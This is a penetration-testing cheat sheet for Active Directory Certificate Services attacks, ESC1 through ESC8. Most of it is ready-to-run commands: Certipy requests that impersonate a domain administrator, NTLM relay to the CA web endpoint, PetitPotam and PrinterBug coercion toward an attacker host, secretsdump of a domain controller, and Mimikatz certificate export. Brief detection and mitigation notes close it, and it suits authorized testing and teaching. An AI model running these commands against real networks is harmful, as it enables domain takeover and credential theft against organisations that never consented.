# Active Directory Certificate Services (AD CS) Attacks

Exploit Active Directory Certificate Services misconfigurations to obtain certificates for privilege escalation.
AD CS attacks, particularly ESC8, provide powerful privilege escalation paths often overlooked by defenders.

## Quick Reference

```bash
# Enumerate AD CS with Certipy
certipy find -u user@domain.local -p password -dc-ip 10.10.10.10

# ESC8 NTLM relay to AD CS
impacket-ntlmrelayx -t http://ca-server/certsrv/certfnsh.asp --adcs --template KerberosAuthentication

# Request TGT with certificate
certipy auth -pfx dc01.pfx -dc-ip 10.10.10.10
```

## AD CS Enumeration

### Certipy

```bash
# Enumerate AD CS
certipy find -u user@domain.local -p password -dc-ip 10.10.10.10 -vulnerable

# Output to file
certipy find -u user@domain.local -p password -dc-ip 10.10.10.10 -vulnerable -output certipy_output

# Enumerate specific CA
certipy find -u user@domain.local -p password -ca CA-NAME
```

### Certutil (Windows)

```cmd
# List certificate authorities
certutil -config - -ping

# List certificate templates
certutil -v -template

# View CA configuration
certutil -CAInfo

# List issued certificates
certutil -view -restrict "Disposition=20" -out "RequesterName,CommonName"
```

## ESC1 - Misconfigured Certificate Templates

### Vulnerability

Template allows:
- Client authentication
- Enrollee supplies subject (CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT)
- No manager approval required
- Low-privileged users can enroll

### Exploitation

```bash
# Request certificate as Domain Admin
certipy req -u user@domain.local -p password -ca CA-NAME -template VulnerableTemplate -upn administrator@domain.local -dc-ip 10.10.10.10

# Authenticate with certificate
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10

# Use TGT
export KRB5CCNAME=administrator.ccache
impacket-psexec -k -no-pass domain.local/administrator@dc.domain.local
```

## ESC2 - Any Purpose EKU

### Vulnerability

Template allows:
- Any Purpose EKU or no EKU
- Low-privileged users can enroll

### Exploitation

```bash
# Request certificate
certipy req -u user@domain.local -p password -ca CA-NAME -template VulnerableTemplate -dc-ip 10.10.10.10

# Use certificate for authentication
certipy auth -pfx user.pfx -dc-ip 10.10.10.10
```

## ESC3 - Certificate Request Agent

### Vulnerability

Template allows:
- Certificate Request Agent EKU
- No enrollment agent restrictions

### Exploitation

```bash
# Request enrollment agent certificate
certipy req -u user@domain.local -p password -ca CA-NAME -template VulnerableTemplate -dc-ip 10.10.10.10

# Use enrollment agent to request certificate for another user
certipy req -u user@domain.local -p password -ca CA-NAME -template User -on-behalf-of 'domain\administrator' -pfx enrollment_agent.pfx -dc-ip 10.10.10.10
```

## ESC4 - Vulnerable Certificate Template ACL

### Vulnerability

Low-privileged user has write access to certificate template

### Exploitation

```bash
# Modify template to make it vulnerable
certipy template -u user@domain.local -p password -template SecureTemplate -save-old

# Request certificate with modified template
certipy req -u user@domain.local -p password -ca CA-NAME -template SecureTemplate -upn administrator@domain.local -dc-ip 10.10.10.10

# Restore template
certipy template -u user@domain.local -p password -template SecureTemplate -configuration SecureTemplate.json
```

## ESC6 - EDITF_ATTRIBUTESUBJECTALTNAME2

### Vulnerability

CA has EDITF_ATTRIBUTESUBJECTALTNAME2 flag set, allowing SAN specification in any template

### Exploitation

```bash
# Request certificate with arbitrary SAN
certipy req -u user@domain.local -p password -ca CA-NAME -template User -upn administrator@domain.local -dc-ip 10.10.10.10

# Authenticate
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10
```

## ESC7 - Vulnerable CA ACL

### Vulnerability

Low-privileged user has ManageCA or ManageCertificates rights on CA

### Exploitation

```bash
# Add officer (requires ManageCA)
certipy ca -u user@domain.local -p password -ca CA-NAME -add-officer user -dc-ip 10.10.10.10

# Enable template (requires ManageCA)
certipy ca -u user@domain.local -p password -ca CA-NAME -enable-template VulnerableTemplate -dc-ip 10.10.10.10

# Issue failed request (requires ManageCertificates)
certipy ca -u user@domain.local -p password -ca CA-NAME -issue-request 123 -dc-ip 10.10.10.10
```

## ESC8 - NTLM Relay to AD CS HTTP Endpoints

### Vulnerability

AD CS web enrollment accessible over HTTP without EPA/SMB signing

### Setup NTLM Relay

```bash
# Start ntlmrelayx targeting AD CS
impacket-ntlmrelayx -t http://ca-server/certsrv/certfnsh.asp --adcs --template KerberosAuthentication -smb2support

# Alternative with specific template
impacket-ntlmrelayx -t http://ca-server/certsrv/certfnsh.asp --adcs --template DomainController -smb2support
```

### Coerce Authentication

```bash
# Printer bug to coerce DC authentication
python3 printerbug.py domain.local/user:password@dc.domain.local attacker-ip

# PetitPotam
python3 PetitPotam.py attacker-ip dc.domain.local -u user -p password

# Coercer (multiple methods)
coercer coerce -u user -p password -d domain.local -l attacker-ip -t dc.domain.local
```

### Use Certificate

```bash
# Convert PFX if needed
certipy cert -pfx dc01.pfx -nokey -out dc01.crt
certipy cert -pfx dc01.pfx -nocert -out dc01.key

# Request TGT with certificate
certipy auth -pfx dc01.pfx -dc-ip 10.10.10.10

# Fix time skew if needed
sudo ntpdate -s dc.domain.local

# Use TGT
export KRB5CCNAME=dc01.ccache
impacket-secretsdump -k -no-pass domain.local/dc01\$@dc.domain.local
```

## Certificate Theft

### DPAPI Certificate Extraction

```powershell
# SharpDPAPI
.\SharpDPAPI.exe certificates /machine

# Mimikatz
.\mimikatz.exe
mimikatz # crypto::capi
mimikatz # crypto::certificates /export
```

### File System Certificate Theft

```bash
# Search for certificate files
find / -name "*.pfx" 2>/dev/null
find / -name "*.p12" 2>/dev/null

# Windows
dir /s /b *.pfx
dir /s /b *.p12
```

## Pass-the-Certificate

### gettgtpkinit.py

```bash
# Request TGT with certificate
python3 gettgtpkinit.py -cert-pfx user.pfx -dc-ip 10.10.10.10 domain.local/user user.ccache

# Use TGT
export KRB5CCNAME=user.ccache
impacket-psexec -k -no-pass domain.local/user@target.domain.local
```

### Rubeus (Windows)

```powershell
# Request TGT with certificate
.\Rubeus.exe asktgt /user:user /certificate:user.pfx /password:certpass /ptt

# Verify
klist

# Access resources
dir \\dc\c$
```

## Notes

### ESC Attack Summary

| ESC | Vulnerability | Impact | Difficulty |
|-----|---------------|--------|------------|
| ESC1 | Enrollee supplies subject | Domain Admin | Easy |
| ESC2 | Any Purpose EKU | Domain Admin | Easy |
| ESC3 | Certificate Request Agent | Domain Admin | Medium |
| ESC4 | Vulnerable template ACL | Domain Admin | Medium |
| ESC5 | Vulnerable PKI object ACL | Domain Admin | Medium |
| ESC6 | EDITF_ATTRIBUTESUBJECTALTNAME2 | Domain Admin | Easy |
| ESC7 | Vulnerable CA ACL | Domain Admin | Medium |
| ESC8 | NTLM relay to HTTP | Domain Admin | Easy |

### Detection

AD CS attacks generate:
- Event ID 4886 (Certificate Services received certificate request)
- Event ID 4887 (Certificate Services approved and issued certificate)
- Event ID 4768 (Kerberos TGT requested) with certificate
- Event ID 4769 (Kerberos TGS requested) with certificate
- Unusual certificate requests for privileged accounts
- Certificate requests with SAN for different users

### Time Skew Issues

Kerberos requires time sync within 5 minutes:
```bash
# Sync time with DC
sudo ntpdate -s dc.domain.local

# Or use faketime
faketime "$(rdate -n dc.domain.local -p | awk '{print $2, $3, $4}')" bash
```

### Certificate Validity

- Certificates remain valid even after password change
- Certificates can be used for authentication until expiration
- Default validity: 1 year
- Useful for persistence

### Common Misconfigurations

Frequently found issues:
- Web enrollment over HTTP (ESC8)
- Templates with enrollee supplies subject (ESC1)
- EDITF_ATTRIBUTESUBJECTALTNAME2 enabled (ESC6)
- Overly permissive template ACLs (ESC4)
- Any Purpose EKU templates (ESC2)

### Mitigation Recommendations

For clients:
- Disable HTTP enrollment (use HTTPS with EPA)
- Enable SMB signing on all systems
- Audit certificate template permissions
- Remove enrollee supplies subject flag
- Disable EDITF_ATTRIBUTESUBJECTALTNAME2
- Implement manager approval for sensitive templates
- Monitor Event IDs 4886, 4887
- Regular AD CS security audits
- Implement certificate enrollment restrictions
- Use short certificate validity periods

### Certipy vs Certify

| Feature | Certipy (Linux) | Certify (Windows) |
|---------|-----------------|-------------------|
| Enumeration | ✓ | ✓ |
| ESC1-8 | ✓ | ✓ |
| Certificate request | ✓ | ✓ |
| Authentication | ✓ | ✗ (use Rubeus) |
| Template modification | ✓ | ✗ |
| Cross-platform | Linux | Windows |

### Resources

- [Certified Pre-Owned - SpecterOps](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf)
- [Certipy Documentation](https://github.com/ly4k/Certipy)
- [HTB Academy - AD CS Attacks](https://academy.hackthebox.com/module/details/147)
- [PKINITtools](https://github.com/dirkjanm/PKINITtools)
